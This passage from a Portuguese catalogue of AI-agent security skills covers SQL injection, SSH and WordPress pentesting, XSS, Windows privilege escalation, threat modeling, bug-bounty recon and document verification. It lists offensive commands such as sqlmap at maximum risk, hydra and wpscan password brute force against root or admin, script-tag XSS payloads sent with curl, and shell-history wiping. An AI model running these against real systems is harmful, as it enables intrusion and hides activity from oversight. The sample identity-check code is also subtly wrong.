- **NFT Security:** Segurança em tokens não fungíveis
- **DAO Security:** Segurança em organizações autônomas

**Integração com outras skills:**
- `binary-analysis-patterns`: Para análise de bytecode
- `constant-time-analysis`: Para operações criptográficas
- `secrets-management`: Para chaves privadas

**Padrões e anti-padrões:**
✅ Fazer: Usar bibliotecas auditadas, implementar checks de segurança, testar extensivamente
❌ Evitar: Implementar criptografia customizada, ignorar edge cases, não usar testnets

**Dicas de performance:**
- Use OpenZeppelin contracts
- Implemente testes automatizados
- Use ferramentas de análise estática

**Comandos úteis:**
```bash
# Instalar Slither
pip install slither-analyzer

# Analisar contrato
slither contracts/MyContract.sol

# Rodar testes
forge test
```

**Referências:**
- [Solidity Security](https://docs.soliditylang.org/en/latest/security-considerations.html)
- [OpenZeppelin](https://www.openzeppelin.com/contracts)
- [Slither](https://github.com/crytic/slither)

---

### 67. sql-injection-testing
**Descrição:** Executar assessments abrangentes de vulnerabilidade SQL injection em aplicações web.

**Quando usar:**
- Testes de penetração em formulários
- Verificação de APIs
- Auditoria de queries

**Exemplos práticos:**
```bash
# Exemplo 1: SQLmap básico
sqlmap -u "https://example.com/?id=1" --dbs

# Exemplo 2: SQLmap com autenticação
sqlmap -u "https://example.com/page?id=1" --cookie="session=abc123" --dbs

# Exemplo 3: POST injection
sqlmap -u "https://example.com/login" --data="user=admin&pass=test" --dbs

# Exemplo 4: Fuzzing de parâmetros
sqlmap -u "https://example.com/page" --batch --forms
```

**Casos de uso avançados:**
- **Blind SQL Injection:** Injeção cega
- **Time-based Injection:** Baseada em tempo
- **Union-based Injection:** Baseada em union

**Integração com outras skills:**
- `ffuf-web-fuzzing`: Para descoberta de parâmetros
- `broken-authentication`: Para autenticação
- `security-and-hardening`: Para prevenção

**Padrões e anti-padrões:**
✅ Fazer: Usar prepared statements, validar input, usar ORM
❌ Evitar: Concatenar queries, confiar em input do usuário, ignorar erros

**Dicas de performance:**
- Use ferramentas automatizadas
- Teste diferentes técnicas
- Analise logs para padrões

**Comandos úteis:**
```bash
# SQLmap
sqlmap -u "https://example.com/?id=1" --risk=3 --level=5

# Ferramentas manuais
# Usar Burp Suite para interceptar e manipular requests

# Verificar logs
grep -i "sql\|error" /var/log/apache2/access.log
```

**Referências:**
- [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQLmap](https://sqlmap.org/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

---

### 68. ssh-penetration-testing
**Descrição:** Conduzir assessments de segurança abrangentes de SSH incluindo enumeração, ataques de credencial, exploração de vulnerabilidades e tunelamento.

**Quando usar:**
- Testes de penetração em servidores SSH
- Verificação de configurações
- Auditoria de segurança

**Exemplos práticos:**
```bash
# Exemplo 1: Enumeração
nmap --script ssh2-enum-algos -p 22 target.com

# Exemplo 2: Brute force
hydra -l root -P passwords.txt ssh://target.com

# Exemplo 3: Verificar configuração
ssh -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null target.com

# Exemplo 4: Tunneling
ssh -L 8080:localhost:80 user@target.com
```

**Casos de uso avançados:**
- **SSH Tunneling:** Tunelamento para acesso remoto
- **Port Forwarding:** Encaminhamento de portas
- **Agent Forwarding:** Encaminhamento de agente

**Integração com outras skills:**
- `linux-privilege-escalation`: Para escalação
- `metasploit-framework`: Para exploração
- `red-team-tactics`: para táticas avançadas

**Padrões e anti-padrões:**
✅ Fazer: Usar chaves SSH, desabilitar login por senha, usar portas não padrão
❌ Evitar: Usar senhas fracas, manter portas padrão, ignorar logs

**Dicas de performance:**
- Use chaves SSH em vez de senhas
- Implemente fail2ban
- Monitore logs regularmente

**Comandos úteis:**
```bash
# Gerar chave SSH
ssh-keygen -t rsa -b 4096

# Conectar com chave
ssh -i ~/.ssh/id_rsa user@target.com

# Verificar configuração
sshd -T | grep -i "protocol\|authentication"
```

**Referências:**
- [SSH Security](https://www.ssh.com/academy/ssh/security)
- [OpenSSH Security](https://www.openssh.com/security.html)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

---

### 69. stride-analysis-patterns
**Descrição:** Aplicar metodologia STRIDE para identificar ameaças sistematicamente.

**Quando usar:**
- Modelagem de ameaças
- Análise de segurança
- Criação de documentação

**Exemplos práticos:**
```markdown
# Exemplo 1: Análise STRIDE
## Componente: Login System

### Spoofing
- Ameaça: Usuário finge ser outro
- Mitigação: Autenticação forte, MFA

### Tampering
- Ameaça: Dados modificados em trânsito
- Mitigação: TLS, integridade de dados

### Repudiation
- Ameaça: Usuário nega ação
- Mitigação: Logging, auditoria

### Information Disclosure
- Ameaça: Dados expostos
- Mitigação: Criptografia, controle de acesso

### Denial of Service
- Ameaça: Serviço indisponível
- Mitigação: Rate limiting, redundância

### Elevation of Privilege
- Ameaça: Acesso não autorizado
- Mitigação: Least privilege, validação

# Exemplo 2: Template de análise
| Componente | STRIDE | Ameaça | Mitigação |
|------------|--------|--------|-----------|
| Login | Spoofing | Credential theft | MFA |
| Database | Tampering | Data modification | Integrity checks |
```

**Casos de uso avançados:**
- **Architecture Review:** Revisão de arquitetura
- **Risk Assessment:** Avaliação de risco
- **Security Design:** Design de segurança

**Integração com outras skills:**
- `threat-modeling-expert`: Para modelagem
- `threat-mitigation-mapping`: Para mitigação
- `security-requirement-extraction`: Para requisitos

**Padrões e anti-padrões:**
✅ Fazer: Analisar todos os componentes, documentar mitigações, revisar regularmente
❌ Evitar: Pular categorias, ignorar ameaças internas, não atualizar

**Dicas de performance:**
- Use templates padronizados
- Envolver equipe multidisciplinar
- Integrar com processos de design

**Comandos úteis:**
```bash
# Criar template
cat > stride-template.md << EOF
# STRIDE Analysis
## Component: [Name]
| Category | Threat | Mitigation |
|----------|--------|------------|
EOF

# Preencher template
cat stride-template.md | sed "s/\[Name\]/Login System/"
```

**Referências:**
- [STRIDE](https://docs.microsoft.com/en-us/previous-versions/commerce-server/ee823609(v=technet.10))
- [OWASP Threat Modeling](https://owasp.org/www-community/Threat_Modeling)
- [Microsoft Threat Modeling](https://docs.microsoft.com/en-us/azure/security/develop/threat-modeling-tool)

---

### 70. supply-chain-security
**Descrição:** Assessment de segurança de cadeia de suprimentos de software: geração SBOM, varredura SCA, revisão pipeline CI/CD e verificação de vulnerabilidades.

**Quando usar:**
- Auditoria de cadeia de suprimentos
- Verificação de dependências
- Análise de pipeline CI/CD

**Exemplos práticos:**
```bash
# Exemplo 1: Geração de SBOM
syft . -o spdx-json > sbom.json

# Exemplo 2: Vulnerability scanning
grype . --fail-on critical

# Exemplo 3: Verificar pipeline
# Analisar .github/workflows/
find .github/workflows -name "*.yml" -exec cat {} \;

# Exemplo 4: Verificar dependências
npm audit --omit=dev
pip-audit
```

**Casos de uso avançados:**
- **Dependency Confusion:** Ataques de confusão de dependências
- **Typosquatting:** Ataques de typosquatting
- **Compromised Packages:** Pacotes comprometidos

**Integração com outras skills:**
- `dependency-management-deps-audit`: Para auditoria
- `gha-security-review`: Para GitHub Actions
- `security-scanning-security-dependencies`: Para varreduras

**Padrões e anti-padrões:**
✅ Fazer: Gerar SBOMs, escanear regularmente, verificar integridade
❌ Evitar: Ignorar dependências, não verificar hash, confiar em mirrors

**Dicas de performance:**
- Use lock files
- Integre com CI/CD
- Configure alertas para vulnerabilidades críticas

**Comandos úteis:**
```bash
# SBOM
syft . -o cyclonedx-json > sbom.json

# Vulnerability scan
grype . --output table

# Verificar integridade
sha256sum package-lock.json
```

**Referências:**
- [Supply Chain Security](https://sigs.sigstore.dev/)
- [NIST SSDF](https://csrc.nist.gov/projects/ssdf)
- [OWASP SCA](https://owasp.org/www-project-dependency-check/)

---

### 71. threat-mitigation-mapping
**Descrição:** Mapear ameaças identificadas para controles e mitigações de segurança apropriados.

**Quando usar:**
- Priorização de investimentos em segurança
- Criação de planos de remediação
- Validação de eficácia de controles

**Exemplos práticos:**
```markdown
# Exemplo 1: Mapeamento de ameaças
## Ameaça: SQL Injection
- Controles:
  - Input validation
  - Prepared statements
  - WAF rules
  - SAST scanning
- Prioridade: Alta
- Eficácia: 95%

## Ameaça: Phishing
- Controles:
  - Security awareness training
  - Email filtering
  - MFA
  - DMARC/DKIM/SPF
- Prioridade: Média
- Eficácia: 80%

# Exemplo 2: Matriz de mitigação
| Ameaça | Controle | Eficácia | Custo |
|--------|----------|----------|-------|
| SQL Injection | Prepared statements | 95% | Baixo |
| XSS | CSP headers | 85% | Baixo |
| Phishing | MFA | 90% | Médio |
```

**Casos de uso avançados:**
- **Risk-based Mitigation:** Mitigação baseada em risco
- **Cost-benefit Analysis:** Análise de custo-benefício
- **Control Effectiveness:** Eficácia de controles

**Integração com outras skills:**
- `stride-analysis-patterns`: Para identificar ameaças
- `threat-modeling-expert`: Para modelagem
- `security-requirement-extraction`: Para requisitos

**Padrões e anti-padrões:**
✅ Fazer: Priorizar por risco, documentar justificativas, revisar regularmente
❌ Evitar: Ignorar custos, não validar eficácia, não atualizar

**Dicas de performance:**
- Use frameworks reconhecidos
- Envolver stakeholders
- Integrar com processos de decisão

**Comandos úteis:**
```bash
# Criar matriz
cat > threat-mitigation.md << EOF
# Threat Mitigation Matrix
| Threat | Control | Effectiveness | Cost |
|--------|---------|---------------|------|
EOF

# Analisar custo-benefício
python3 cost_benefit.py --threats threats.json --controls controls.json
```

**Referências:**
- [NIST SP 800-53](https://csrc.nist.gov/publications/detail/sp/800-53/rev-5/final)
- [ISO 27001](https://www.iso.org/iso-27001-information-security.html)
- [CIS Controls](https://www.cisecurity.org/controls)

---

### 72. threat-modeling-expert
**Descrição:** Especialista em metodologias de modelagem de ameaças, revisão de arquitetura de segurança e avaliação de riscos.

**Quando usar:**
- Revisões de arquitetura de segurança
- Identificação de ameaças
- Construção de sistemas seguros

**Exemplos práticos:**
```markdown
# Exemplo 1: Sessão de Threat Modeling
## Componente: API Gateway

### Ameaças identificadas
1. **Spoofing:** Usuário finge ser outro
   - Mitigação: OAuth 2.0, JWT validation
2. **Tampering:** Dados modificados em trânsito
   - Mitigação: TLS, HMAC
3. **Information Disclosure:** Dados expostos em logs
   - Mitigação: Log sanitization, encryption
4. **DoS:** Ataque de negação de serviço
   - Mitigação: Rate limiting, WAF

### Recomendações
- Implementar autenticação robusta
- Usar criptografia para dados sensíveis
- Implementar monitoramento e alertas

# Exemplo 2: Documento de Threat Model
# Threat Model - API Gateway
## Data: 2026-09-14
## Participants: Security Team, Dev Team

## System Context
- API Gateway handling authentication and rate limiting
- Backend services with sensitive data
- External third-party integrations

## Threats Identified
| ID | Threat | Component | Mitigation |
|----|--------|-----------|------------|
| T1 | Credential stuffing | Auth | Rate limiting, MFA |
| T2 | Data leakage | API | Input validation, output encoding |
```

**Casos de uso avançados:**
- **Architecture Review:** Revisão de arquitetura
- **Design Review:** Revisão de design
- **Risk Assessment:** Avaliação de risco

**Integração com outras skills:**
- `stride-analysis-patterns`: Para STRIDE
- `attack-tree-construction`: Para árvores de ataque
- `threat-mitigation-mapping`: Para mitigação

**Padrões e anti-padrões:**
✅ Fazer: Documentar tudo, envolver equipe multidisciplinar, revisar regularmente
❌ Evitar: Modelar apenas uma vez, ignorar mudanças, não validar com operações

**Dicas de performance:**
- Use ferramentas de threat modeling
- Mantenha templates atualizados
- Integre com processos de design

**Comandos úteis:**
```bash
# Usar Microsoft Threat Modeling Tool
# https://docs.microsoft.com/en-us/azure/security/develop/threat-modeling-tool

# Criar diagrama
# Usar Mermaid ou Draw.io

# Documentar
cat > threat-model.md << EOF
# Threat Model
## Component: [Name]
EOF
```

**Referências:**
- [OWASP Threat Modeling](https://owasp.org/www-community/Threat_Modeling)
- [Microsoft Threat Modeling](https://docs.microsoft.com/en-us/azure/security/develop/threat-modeling-tool)
- [STRIDE](https://docs.microsoft.com/en-us/previous-versions/commerce-server/ee823609(v=technet.10))

---

### 73. top-web-vulnerabilities
**Descrição:** Referência abrangente e estruturada das 100 vulnerabilidades mais críticas de aplicações web.

**Quando usar:**
- Identificação sistemática de vulnerabilidades
- Avaliação de impacto
- Orientação de remediação

**Exemplos práticos:**
```markdown
# Exemplo 1: OWASP Top 10 2021
1. **A01:2021 - Broken Access Control**
   - Descrição: Falhas em controles de acesso
   - Exemplo: IDOR, privilege escalation
   - Mitigação: Implementar autorização server-side

2. **A02:2021 - Cryptographic Failures**
   - Descrição: Falhas em criptografia
   - Exemplo: Dados sensíveis em texto plano
   - Mitigação: Usar TLS, criptografar dados sensíveis

3. **A03:2021 - Injection**
   - Descrição: Injeção de código
   - Exemplo: SQL injection, XSS
   - Mitigação: Input validation, prepared statements

# Exemplo 2: Checklist de vulnerabilidades
## A01: Broken Access Control
- [ ] Verificar autorização em todos os endpoints
- [ ] Implementar least privilege
- [ ] Testar IDOR
- [ ] Verificar CORS

## A02: Cryptographic Failures
- [ ] Verificar uso de TLS
- [ ] Criptografar dados sensíveis
- [ ] Usar algoritmos seguros
- [ ] Gerenciar chaves adequadamente
```

**Casos de uso avançados:**
- **Vulnerability Assessment:** Avaliação de vulnerabilidades
- **Penetration Testing:** Testes de penetração
- **Security Training:** Treinamento de segurança

**Integração com outras skills:**
- `sql-injection-testing`: Para SQL injection
- `xss-html-injection`: Para XSS
- `broken-authentication`: Para autenticação

**Padrões e anti-padrões:**
✅ Fazer: Usar como referência, testar sistematicamente, priorizar por impacto
❌ Evitar: Ignorar vulnerabilidades de baixo risco, não atualizar, não validar

**Dicas de performance:**
- Use checklists padronizadas
- Automatize verificações
- Mantenha-se atualizado com novas vulnerabilidades

**Comandos úteis:**
```bash
# Verificar OWASP Top 10
# https://owasp.org/www-project-top-ten/

# Ferramentas de referência
# https://cwe.mitre.org/
# https://nvd.nist.gov/
```

**Referências:**
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE](https://cwe.mitre.org/)
- [NVD](https://nvd.nist.gov/)

---

### 74. varlock
**Descrição:** Gerenciamento de variáveis de ambiente seguro por padrão para sessões Claude Code.

**Quando usar:**
- Sessões de Claude Code
- Gerenciamento de variáveis de ambiente
- Proteção de segredos

**Exemplos práticos:**
```bash
# Exemplo 1: Configurar variáveis de ambiente
export API_KEY="your-api-key"
export DATABASE_URL="postgresql://user:pass@localhost/db"

# Exemplo 2: Usar .env file
echo "API_KEY=your-api-key" > .env
echo "DATABASE_URL=postgresql://user:pass@localhost/db" >> .env

# Exemplo 3: Carregar variáveis
source .env
# ou
export $(cat .env | xargs)

# Exemplo 4: Verificar variáveis
env | grep -i "api\|secret\|password"
```

**Casos de uso avançados:**
- **Environment Isolation:** Isolamento de ambientes
- **Secret Rotation:** Rotação de segredos
- **Audit Logging:** Registro de acessos

**Integração com outras skills:**
- `varlock-claude-skill`: Para Claude Code
- `secrets-management`: Para gestão de segredos
- `cyber-audit`: Para auditoria

**Padrões e anti-padrões:**
✅ Fazer: Usar variáveis de ambiente, não commitar .env, rotacionar segredos
❌ Evitar: Hardcoded secrets, commitar .env, compartilhar credenciais

**Dicas de performance:**
- Use .env.example para documentação
- Implemente .gitignore
- Use ferramentas de gestão de segredos

**Comandos úteis:**
```bash
# Criar .env
echo "API_KEY=your-api-key" > .env

# Carregar variáveis
export $(cat .env | xargs)

# Verificar
env | grep -i "api\|secret"
```

**Referências:**
- [12-Factor App](https://12factor.net/config)
- [dotenv](https://github.com/motdotla/dotenv)
- [Gitignore](https://git-scm.com/docs/gitignore)

---

### 75. varlock-claude-skill
**Descrição:** Gerenciamento seguro de variáveis de ambiente garantindo que segredos não sejam expostos em sessões Claude, terminais, logs ou commits git.

**Quando usar:**
- Sessões de Claude Code
- Proteção de segredos
- Prevenção de vazamentos

**Exemplos práticos:**
```bash
# Exemplo 1: Carregar variáveis seguras
source ~/.config/claude/secrets.env

# Exemplo 2: Verificar se segredos não estão expostos
env | grep -i "api\|secret\|password" | wc -l

# Exemplo 3: Limpar histórico
history -c
unset HISTFILE

# Exemplo 4: Usar ferramentas de gestão
vault kv get secret/my-app
```

**Casos de uso avançados:**
- **Session Security:** Segurança de sessões
- **Log Protection:** Proteção de logs
- **Git Protection:** Proteção de commits

**Integração com outras skills:**
- `varlock`: Para variáveis de ambiente
- `secrets-management`: Para gestão de segredos
- `cyber-audit`: Para auditoria

**Padrões e anti-padrões:**
✅ Fazer: Usar ferramentas de gestão, verificar exposição, limpar históricos
❌ Evitar: Armazenar segredos em texto plano, compartilhar sessões, ignorar logs

**Dicas de performance:**
- Use ferramentas de gestão de segredos
- Automatize verificações
- Implemente monitoramento

**Comandos úteis:**
```bash
# Verificar exposição
env | grep -i "api\|secret\|password"

# Limpar histórico
history -c
unset HISTFILE

# Usar vault
vault kv get secret/my-app
```

**Referências:**
- [Claude Code](https://docs.anthropic.com/en/docs/claude-code)
- [Vault](https://www.vaultproject.io/)
- [12-Factor App](https://12factor.net/config)

---

### 76. vulnerability-scanner
**Descrição:** Princípios avançados de análise de vulnerabilidades. OWASP 2025, Supply Chain Security, mapeamento de superfície de ataque e priorização de riscos.

**Quando usar:**
- Análise avançada de vulnerabilidades
- Mapeamento de superfície de ataque
- Priorização de riscos

**Exemplos práticos:**
```bash
# Exemplo 1: Nmap com scripts de vulnerabilidade
nmap --script vuln target.com

# Exemplo 2: OWASP ZAP
zap-cli quick-scan -s all -r https://example.com

# Exemplo 3: Nessus
nessuscli scan new --targets target.com

# Exemplo 4: OpenVAS
gvm-cli --gmp-username admin --gmp-password pass socket /run/gvmd/gvmd.sock --xml "<get_scanners/>"
```

**Casos de uso avançados:**
- **Vulnerability Assessment:** Avaliação de vulnerabilidades
- **Penetration Testing:** Testes de penetração
- **Continuous Monitoring:** Monitoramento contínuo

**Integração com outras skills:**
- `scanning-tools`: Para ferramentas
- `security-scanning-security-sast`: Para SAST
- `security-scanning-security-dependencies`: Para dependências

**Padrões e anti-padrões:**
✅ Fazer: Usar múltiplas ferramentas, priorizar por risco, atualizar regularly
❌ Evitar: Confiar em uma ferramenta, ignorar falsos positivos, não validar

**Dicas de performance:**
- Use ferramentas complementares
- Automatize varreduras
- Mantenha bases de dados atualizadas

**Comandos úteis:**
```bash
# Nmap
nmap -sV -sC --script vuln target.com

# OWASP ZAP
zap-cli quick-scan -s all https://example.com

# Nessus
nessuscli scan list
```

**Referências:**
- [Nmap](https://nmap.org/)
- [OWASP ZAP](https://www.zaproxy.org/)
- [Nessus](https://www.tenable.com/products/nessus)

---

### 77. windows-privilege-escalation
**Descrição:** Metodologias sistemáticas para descobrir e explorar vulnerabilidades de escalação de privilégios em sistemas Windows.

**Quando usar:**
- Testes de penetração em ambientes Windows
- Identificação de caminhos de escalação
- Auditoria de configurações

**Exemplos práticos:**
```powershell
# Exemplo 1: Verificar informações do sistema
systeminfo
hostname
whoami /all

# Exemplo 2: Verificar serviços
sc query
wmic service list brief

# Exemplo 3: Verificar permissões
icacls "C:\Program Files"

# Exemplo 4: Verificar tarefas agendadas
schtasks /query /fo LIST /v
```

**Casos de uso avançados:**
- **Token Manipulation:** Manipulação de tokens
- **Service Exploitation:** Exploração de serviços
- **Registry Abuse:** Abuso de registro

**Integração com outras skills:**
- `linux-privilege-escalation`: Para Linux
- `metasploit-framework`: Para exploração
- `ssh-penetration-testing`: Para SSH

**Padrões e anti-padrões:**
✅ Fazer: Documentar caminhos, testar em staging, obter autorização
❌ Evitar: Testar em produção, ignorar impacto, não validar descobertas

**Dicas de performance:**
- Use ferramentas automatizadas
- Mantenha base de dados de exploits
- Teste em ambientes controlados

**Comandos úteis:**
```powershell
# WinPEAS
.\winpeas.exe

# PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# SharpUp
.\SharpUp.exe audit
```

**Referências:**
- [HackTricks Windows](https://book.hacktricks.xyz/windows-hardening/)
- [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
- [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)

---

### 78. wireshark-analysis
**Descrição:** Executar análise abrangente de tráfego de rede usando Wireshark para captura, filtragem e exame de pacotes.

**Quando usar:**
- Investigações de segurança
- Otimização de performance
- Troubleshooting de rede

**Exemplos práticos:**
```bash
# Exemplo 1: Capturar tráfego
tshark -i eth0 -w capture.pcap

# Exemplo 2: Filtrar por protocolo
tshark -r capture.pcap -Y "http"

# Exemplo 3: Analisar conversas
tshark -r capture.pcap -z conv,tcp

# Exemplo 4: Extrair objetos
tshark -r capture.pcap --export-objects http,exported_files
```

**Casos de uso avançados:**
- **Network Forensics:** Forense de rede
- **Malware Analysis:** Análise de malware
- **Performance Analysis:** Análise de performance

**Integração com outras skills:**
- `protocol-reverse-engineering`: Para protocolos
- `memory-forensics`: Para memória
- `malware-analyst`: Para malware

**Padrões e anti-padrões:**
✅ Fazer: Capturar dados suficientes, usar filtros, documentar achados
❌ Evitar: Ignorar tráfego criptografado, não validar, pular análise

**Dicas de performance:**
- Use filtros para reduzir volume
- Automatize análise com scripts
- Mantenha biblioteca de filtros

**Comandos úteis:**
```bash
# Capturar com filtros
tshark -i eth0 -f "port 443" -w capture.pcap

# Analisar HTTP
tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri

# Extrair arquivos
tshark -r capture.pcap --export-objects http,exported_files
```

**Referências:**
- [Wireshark](https://www.wireshark.org/)
- [TShark](https://www.wireshark.org/docs/man-pages/tshark.html)
- [Wireshark Display Filters](https://wiki.wireshark.org/DisplayFilters)

---

### 79. wordpress-penetration-testing
**Descrição:** Avaliar instalações WordPress para vulnerabilidades comuns e superfícies de ataque WordPress 7.0.

**Quando usar:**
- Testes de penetração em WordPress
- Verificação de plugins e temas
- Auditoria de configurações

**Exemplos práticos:**
```bash
# Exemplo 1: Enumeração de usuários
wpscan --url https://example.com --enumerate u

# Exemplo 2: Verificar plugins
wpscan --url https://example.com --enumerate vp

# Exemplo 3: Verificar temas
wpscan --url https://example.com --enumerate vt

# Exemplo 4: Brute force
wpscan --url https://example.com --passwords passwords.txt --usernames admin
```

**Casos de uso avançados:**
- **Plugin Vulnerabilities:** Vulnerabilidades em plugins
- **Theme Vulnerabilities:** Vulnerabilidades em temas
- **Configuration Issues:** Problemas de configuração

**Integração com outras skills:**
- `sql-injection-testing`: Para SQL injection
- `xss-html-injection`: Para XSS
- `scanning-tools`: Para varreduras

**Padrões e anti-padrões:**
✅ Fazer: Manter WordPress atualizado, usar plugins confiáveis, implementar segurança
❌ Evitar: Usar plugins abandonados, ignorar atualizações, não monitorar

**Dicas de performance:**
- Use WPScan para varreduras
- Implemente wordfence ou similar
- Monitore logs regularmente

**Comandos úteis:**
```bash
# WPScan
wpscan --url https://example.com --enumerate ap,at,u

# Verificar versão
curl -s https://example.com | grep "generator"

# Verificar readme
curl -s https://example.com/readme.html
```

**Referências:**
- [WPScan](https://wpscan.org/)
- [WordPress Security](https://codex.wordpress.org/Security_FAQ)
- [OWASP WordPress](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/16-Testing_for_WordPress)

---

### 80. xss-html-injection
**Descrição:** Executar assessments abrangentes de vulnerabilidades de injeção client-side em aplicações web.

**Quando usar:**
- Testes de penetração em formulários
- Verificação de XSS
- Auditoria de validação de input

**Exemplos práticos:**
```bash
# Exemplo 1: XSS refletido
curl "https://example.com/search?q=<script>alert(1)</script>"

# Exemplo 2: XSS armazenado
# Injetar em campo de comentário
curl -X POST -d "comment=<script>alert(1)</script>" https://example.com/comment

# Exemplo 3: DOM-based XSS
# Analisar JavaScript para pontos de injeção

# Exemplo 4: Ferramenta automatizada
dalfox url "https://example.com?q=" -p test.txt
```

**Casos de uso avançados:**
- **Stored XSS:** XSS armazenado
- **DOM-based XSS:** XSS baseado em DOM
- **Blind XSS:** XSS cego

**Integração com outras skills:**
- `html-injection-testing`: Para injeção HTML
- `frontend-security-coder`: Para prevenção
- `burp-suite-testing`: Para análise detalhada

**Padrões e anti-padrões:**
✅ Fazer: Validar todo input, usar CSP, implementar encoding
❌ Evitar: Confiar em validação client-side, usar eval(), ignorar encoding

**Dicas de performance:**
- Use ferramentas automatizadas
- Teste em diferentes contextos
- Analise logs para padrões

**Comandos úteis:**
```bash
# XSS Scanner
python3 xss_scanner.py -t https://example.com

# Ferramentas manuais
# Usar Burp Suite para testar payloads

# Verificar CSP
curl -I https://example.com | grep -i content-security-policy
```

**Referências:**
- [OWASP XSS](https://owasp.org/www-community/attacks/xss)
- [XSS Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger XSS](https://portswigger.net/web-security/cross-site-scripting)

---

## Pentest Tools Category

### 81. src-hunter
**Descrição:** Workflow de caça a vulnerabilidades bug-bounty/SRC: metodologia de cinco fases (intake, recon, enumeração, hunt, report) com playbooks de ataque para SQLi, XSS, RCE, SSRF, IDOR, CSRF, path traversal e file upload.

**Quando usar:**
- Caça sistemática a vulnerabilidades
- Programas de bug bounty
- Assessments de segurança

**Exemplos práticos:**
```bash
# Exemplo 1: Reconhecimento
subfinder -d example.com -o subdomains.txt
httpx -l subdomains.txt -o live.txt

# Exemplo 2: Enumeração
gobuster dir -u https://example.com -w wordlist.txt

# Exemplo 3: Caça a vulnerabilidades
nuclei -l live.txt -t nuclei-templates/

# Exemplo 4: Fuzzing
ffuf -u https://example.com/FUZZ -w wordlist.txt
```

**Casos de uso avançados:**
- **Bug Bounty Programs:** Estruturar programas
- **Security Research:** Pesquisa avançada
- **Automated Discovery:** Descoberta automatizada

**Integração com outras skills:**
- `ethical-hacking-methodology`: Para metodologia
- `red-team-tools`: Para ferramentas
- `scanning-tools`: Para varreduras

**Padrões e anti-padrões:**
✅ Fazer: Seguir metodologia, documentar tudo, validar descobertas
❌ Evitar: Pular fases, ignorar escopo, não reportar vulnerabilidades

**Dicas de performance:**
- Use automação para reconhecimento
- Mantenha wordlists atualizadas
- Foque em vectores de ataque de alto impacto

**Comandos úteis:**
```bash
# Pipeline completo
subfinder -d example.com -silent | httpx -silent | nuclei -t nuclei-templates/

# Ferramentas essenciais
# subfinder, httpx, nuclei, katana, ffuf, sqlmap
```

**Referências:**
- [Bug Bounty Methodology](https://www.bugbountyhunting.com/)
- [ProjectDiscovery](https://github.com/projectdiscovery)
- [HackTricks](https://book.hacktricks.xyz/)

---

## Document Verification Category

### 82. check-identity-pack
**Descrição:** Executar verificação de identidade AFP 100-point ou AUSTRAC safe-harbour sobre conjunto de documentos e reportar exatamente o que está faltando.

**Quando usar:**
- Verificação de documentos de identidade
- Onboarding de funcionários
- Avaliação de conformidade

**Exemplos práticos:**
```python
# Exemplo 1: Verificar documentos
def check_identity_pack(documents):
    required_docs = {
        'passport': 70,
        'drivers_license': 40,
        'birth_certificate': 70,
        'medicare': 25
    }
    
    total_points = 0
    missing_docs = []
    
    for doc in documents:
        if doc in required_docs:
            total_points += required_docs[doc]
        else:
            missing_docs.append(doc)
    
    if total_points >= 100:
        return {'status': 'verified', 'points': total_points}
    else:
        return {'status': 'incomplete', 'points': total_points, 'missing': missing_docs}

# Exemplo 2: Verificar AUSTRAC
def check_austrac(documents):
    # Verificar se documentos atendem a AUSTRAC safe harbour
    pass

# Exemplo 3: Gerar relatório
def generate_report(verification_result):
    return f"Status: {verification_result['status']}, Points: {verification_result['points']}"
```

**Casos de uso avançados:**
- **KYC (Know Your Customer):** Verificação de clientes
- **AML Compliance:** Conformidade anti-lavagem
- **Identity Verification:** Verificação de identidade

**Integração com outras skills:**
- `verify-document`: Para verificar documentos
- `screen-adverse-media`: Para mídia adversa
- `detect-ai-text`: Para detectar texto gerado por IA

**Padrões e anti-padrões:**
✅ Fazer: Verificar todos os documentos, manter registros, seguir regulamentações
❌ Evitar: Aceitar documentos sem verificar, ignorar pontos faltantes, não atualizar

**Dicas de performance:**
- Use ferramentas de OCR para extração
- Automatize verificações
- Integre com processos de onboarding

**Comandos úteis:**
```bash
# Verificar documentos
python3 check_identity.py --documents passport,drivers_license

# Gerar relatório
python3 generate_report.py --format pdf
```

**Referências:**
- [AFP 100-point ID check](https://www.afp.gov.au/100-point-id-check)
- [AUSTRAC](https://www.austrac.gov.au/)
- [Identity Verification](https://www.identityverification.com/)

---

### 83. detect-ai-text
**Descrição:** Estimar se a prosa de um documento foi escrita por IA, com sinais linguísticos e abstenção honesta em não-prosa.

**Quando usar:**
- Triagem de conteúdo acadêmico
- Verificação de originalidade
- Auditoria de conteúdo

**Exemplos práticos:**
```python
# Exemplo 1: Análise de texto
def detect_ai_text(text):
    indicators = [
        'perplexity_score',  # Mede imprevisibilidade
        'burstiness_score',  # Mede variação de sentenças
        'vocabulary_richness',  # Mede riqueza de vocabulário
        'repetition_patterns'  # Mede padrões de repetição
    ]
    
    # Analisar indicadores
    scores = {}
    for indicator in indicators:
        scores[indicator] = analyze_indicator(text, indicator)
    
    # Calcular probabilidade
    ai_probability = calculate_probability(scores)
    
    return {
        'ai_probability': ai_probability,
        'indicators': scores,
        'recommendation': 'review' if ai_probability > 0.7 else 'accept'
    }

# Exemplo 2: Usar ferramentas
# GPTZero, Originality.ai, Turnitin

# Exemplo 3: Análise estatística
def analyze_patterns(text):
    sentences = text.split('.')
    avg_length = sum(len(s.split()) for s in sentences) / len(sentences)
    return avg_length
```

**Casos de uso avançados:**
- **Academic Integrity:** Integridade acadêmica
- **Content Verification:** Verificação de conteúdo
- **Plagiarism Detection:** Detecção de plágio

**Integração com outras skills:**
- `verify-citations`: Para verificar citações
- `extract-document-data`: Para extrair dados
- `verify-document`: Para verificar documentos

**Padrões e anti-padrões:**
✅ Fazer: Usar como ferramenta de triagem, não como decisão final, revisar manualmente
❌ Evitar: Confiar 100% em ferramentas, ignorar contexto, não revisar

**Dicas de performance:**
- Use múltiplas ferramentas
- Considere contexto
- Mantenha atualizado com novas técnicas

**Comandos úteis:**
```bash
# GPTZero
